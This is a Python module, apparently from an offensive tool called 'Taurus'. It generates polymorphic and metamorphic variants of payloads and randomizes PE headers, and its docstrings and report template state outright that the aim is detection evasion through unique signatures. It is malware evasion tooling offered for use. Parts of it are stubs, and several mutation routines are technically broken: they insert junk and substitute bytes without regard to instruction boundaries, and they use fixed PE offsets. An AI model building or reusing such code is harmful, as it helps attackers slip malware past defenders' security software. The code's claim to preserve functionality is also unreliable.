"""
Polymorphic and Metamorphic Variant Generator for Taurus
Automatically generates 100+ unique variants of payloads
Each variant has different signature while maintaining functionality
"""
import random
import hashlib
from typing import List, Dict, Tuple
from utils.logger import get_logger

logger = get_logger()


class PolymorphicEngine:
    """
    Polymorphic code generation
    Changes code structure while preserving functionality
    """
    
    @staticmethod
    def generate_nop_sled(length: int = 10) -> bytes:
        """Generate polymorphic NOP sled"""
        nop_equivalents = [
            b'\x90',  # NOP
            b'\x97',  # XCHG EAX, EDI
            b'\x96',  # XCHG EAX, ESI
            b'\x40\x48',  # INC EAX; DEC EAX
            b'\x41\x49',  # INC ECX; DEC ECX
        ]
        
        sled = bytearray()
        for _ in range(length):
            sled.extend(random.choice(nop_equivalents))
        
        return bytes(sled)
    
    @staticmethod
    def mutate_instruction(instruction: bytes) -> bytes:
        """
        Mutate instruction to equivalent form
        
        Example: MOV EAX, 5 -> PUSH 5; POP EAX
        """
        mutations = {
            # MOV EAX, imm -> PUSH imm; POP EAX
            b'\xB8': lambda val: b'\x68' + val + b'\x58',
            
            # ADD EAX, imm -> SUB EAX, -imm
            b'\x05': lambda val: b'\x2D' + bytes([256 - val[0]]) + val[1:],
        }
        
        if instruction[0:1] in mutations:
            return mutations[instruction[0:1]](instruction[1:])
        
        return instruction
    
    @staticmethod
    def insert_junk_instructions(code: bytes, density: float = 0.2) -> bytes:
        """Insert junk instructions that don't affect execution"""
        junk_patterns = [
            b'\x90',  # NOP
            b'\x50\x58',  # PUSH EAX; POP EAX
            b'\x51\x59',  # PUSH ECX; POP ECX
            b'\x87\xC0',  # XCHG EAX, EAX
        ]
        
        result = bytearray()
        for byte in code:
            result.append(byte)
            
            if random.random() < density:
                result.extend(random.choice(junk_patterns))
        
        return bytes(result)


class MetamorphicEngine:
    """
    Metamorphic code generation
    Completely rewrites code while preserving semantics
    """
    
    @staticmethod
    def rewrite_function(code: str) -> str:
        """
        Completely rewrite function with different structure
        
        Example transformations:
        - Loop unrolling
        - Function inlining
        - Code reordering
        """
        # Simplified example
        transformations = [
            MetamorphicEngine._unroll_loops,
            MetamorphicEngine._inline_functions,
            MetamorphicEngine._reorder_blocks,
        ]
        
        transformed = code
        for transform in transformations:
            transformed = transform(transformed)
        
        return transformed
    
    @staticmethod
    def _unroll_loops(code: str) -> str:
        """Unroll small loops"""
        # Simplified - real implementation would parse and unroll
        return code
    
    @staticmethod
    def _inline_functions(code: str) -> str:
        """Inline small functions"""
        # Simplified - real implementation would inline calls
        return code
    
    @staticmethod
    def _reorder_blocks(code: str) -> str:
        """Reorder independent code blocks"""
        # Simplified - real implementation would analyze dependencies
        return code
    
    @staticmethod
    def substitute_instructions(code: bytes) -> bytes:
        """
        Substitute instructions with equivalent sequences
        
        Example: INC EAX -> ADD EAX, 1 -> LEA EAX, [EAX+1]
        """
        substitutions = {
            b'\x40': [  # INC EAX
                b'\x83\xC0\x01',  # ADD EAX, 1
                b'\x8D\x40\x01',  # LEA EAX, [EAX+1]
            ],
            b'\x48': [  # DEC EAX
                b'\x83\xE8\x01',  # SUB EAX, 1
                b'\x8D\x40\xFF',  # LEA EAX, [EAX-1]
            ],
        }
        
        result = bytearray()
        i = 0
        while i < len(code):
            byte = code[i:i+1]
            if byte in substitutions:
                result.extend(random.choice(substitutions[byte]))
            else:
                result.append(code[i])
            i += 1
        
        return bytes(result)


class VariantGenerator:
    """Generate multiple unique variants of payload"""
    
    def __init__(self):
        self.polymorphic = PolymorphicEngine()
        self.metamorphic = MetamorphicEngine()
        self.generated_hashes = set()
    
    def generate_variants(self, payload: bytes, count: int = 100) -> List[Tuple[bytes, str]]:
        """
        Generate multiple unique variants
        
        Args:
            payload: Original payload
            count: Number of variants to generate
        
        Returns:
            List of (variant_bytes, hash) tuples
        """
        variants = []
        
        for i in range(count):
            variant = self._create_variant(payload, i)
            variant_hash = hashlib.sha256(variant).hexdigest()
            
            # Ensure uniqueness
            if variant_hash not in self.generated_hashes:
                self.generated_hashes.add(variant_hash)
                variants.append((variant, variant_hash))
                
                if len(variants) % 10 == 0:
                    logger.info(f"Generated {len(variants)} variants...")
        
        logger.success(f"Generated {len(variants)} unique variants")
        return variants
    
    def _create_variant(self, payload: bytes, seed: int) -> bytes:
        """Create single variant with different techniques"""
        random.seed(seed)
        
        variant = bytearray(payload)
        
        # Apply random transformations
        techniques = [
            lambda p: self.polymorphic.insert_junk_instructions(p, density=random.uniform(0.1, 0.3)),
            lambda p: self._add_random_padding(p),
            lambda p: self._shuffle_sections(p),
            lambda p: self.metamorphic.substitute_instructions(p),
        ]
        
        # Apply 2-4 random techniques
        num_techniques = random.randint(2, 4)
        selected = random.sample(techniques, num_techniques)
        
        for technique in selected:
            variant = bytearray(technique(bytes(variant)))
        
        # Add unique marker
        variant.extend(f"VARIANT_{seed}".encode())
        
        return bytes(variant)
    
    def _add_random_padding(self, payload: bytes) -> bytes:
        """Add random padding"""
        padding_size = random.randint(10, 100)
        padding = bytes([random.randint(0, 255) for _ in range(padding_size)])
        return payload + padding
    
    def _shuffle_sections(self, payload: bytes) -> bytes:
        """Shuffle independent sections"""
        # Simplified - real implementation would parse PE sections
        return payload
    
    def generate_variant_report(self, variants: List[Tuple[bytes, str]]) -> str:
        """Generate report of variant statistics"""
        sizes = [len(v[0]) for v in variants]
        hashes = [v[1] for v in variants]
        
        report = f"""
# Variant Generation Report

## Statistics
- Total Variants: {len(variants)}
- Unique Hashes: {len(set(hashes))}
- Size Range: {min(sizes)} - {max(sizes)} bytes
- Average Size: {sum(sizes) / len(sizes):.0f} bytes

## Techniques Applied
- Polymorphic NOP sleds
- Junk instruction insertion
- Instruction substitution
- Random padding
- Section shuffling

## Detection Evasion
- Each variant has unique signature
- Different file hashes
- Varied file sizes
- Maintains functionality
"""
        return report


class SignatureRandomizer:
    """Randomize signatures to evade detection"""
    
    @staticmethod
    def randomize_pe_header(pe_data: bytes) -> bytes:
        """Randomize PE header fields that don't affect execution"""
        # Simplified - real implementation would parse PE properly
        data = bytearray(pe_data)
        
        # Randomize timestamp (offset 0x88 in PE header)
        if len(data) > 0x88 + 4:
            timestamp = random.randint(0, 0xFFFFFFFF)
            data[0x88:0x88+4] = timestamp.to_bytes(4, 'little')
        
        # Randomize checksum (offset 0x98)
        if len(data) > 0x98 + 4:
            checksum = random.randint(0, 0xFFFFFFFF)
            data[0x98:0x98+4] = checksum.to_bytes(4, 'little')
        
        return bytes(data)
    
    @staticmethod
    def add_overlay_data(pe_data: bytes) -> bytes:
        """Add random overlay data to end of PE"""
        overlay_size = random.randint(100, 1000)
        overlay = bytes([random.randint(0, 255) for _ in range(overlay_size)])
        return pe_data + overlay


# Global instance
_variant_generator = None


def get_variant_generator() -> VariantGenerator:
    """Get global variant generator"""
    global _variant_generator
    if _variant_generator is None:
        _variant_generator = VariantGenerator()
    return _variant_generator
